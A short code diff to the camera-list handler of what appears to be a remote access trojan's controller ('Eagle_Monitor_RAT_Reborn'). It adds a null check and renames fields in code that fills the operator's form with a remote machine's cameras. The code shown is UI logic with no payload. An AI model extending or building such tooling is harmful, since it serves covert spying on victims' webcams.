@@ -13,35 +13,24 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
     {
         public RemoteCameraPacketHandler(RemoteCameraPacket remoteCameraPacket) : base()//, ClientHandler clientHandler) : base() 
         {
-            try
+            if (ClientHandler.ClientHandlersList[remoteCameraPacket.BaseIp].ClientForm != null)
             {
-                ClientHandler.ClientHandlersList[remoteCameraPacket.baseIp].clientForm.camerasGuna2ComboBox.BeginInvoke((MethodInvoker)(() =>
+                try
                 {
-                    foreach (string camera in remoteCameraPacket.cameras)
+                    ClientHandler.ClientHandlersList[remoteCameraPacket.BaseIp].ClientForm.camerasGuna2ComboBox.BeginInvoke((MethodInvoker)(() =>
                     {
-                        ClientHandler.ClientHandlersList[remoteCameraPacket.baseIp].clientForm.camerasGuna2ComboBox.Items.Add(camera);
-                    }
+                        foreach (string camera in remoteCameraPacket.cameras)
+                        {
+                            ClientHandler.ClientHandlersList[remoteCameraPacket.BaseIp].ClientForm.camerasGuna2ComboBox.Items.Add(camera);
+                        }
 
-                    if (remoteCameraPacket.cameras.Count > 0)
-                        ClientHandler.ClientHandlersList[remoteCameraPacket.baseIp].clientForm.camerasGuna2ComboBox.SelectedIndex = 0;
-                }));
+                        if (remoteCameraPacket.cameras.Count > 0)
+                            ClientHandler.ClientHandlersList[remoteCameraPacket.BaseIp].ClientForm.camerasGuna2ComboBox.SelectedIndex = 0;
+                    }));
+                }
+                catch { }
+                return;
             }
-            catch { }
-            return;
-            /*try
-            {
-                ClientHandler.ClientHandlersList[remoteCameraPacket.baseIp].clientForm.BeginInvoke((MethodInvoker)(() =>
-                {
-                    foreach (string camera in remoteCameraPacket.cameras)
-                    {
-                        ClientHandler.ClientHandlersList[remoteCameraPacket.baseIp].clientForm.camerasGuna2ComboBox.Items.Add(camera);
-                    }
-
-                    if (remoteCameraPacket.cameras.Count > 0)
-                        ClientHandler.ClientHandlersList[remoteCameraPacket.baseIp].clientForm.camerasGuna2ComboBox.SelectedIndex = 0;
-                }));
-            }
-            catch { }*/
         }
     }
 }
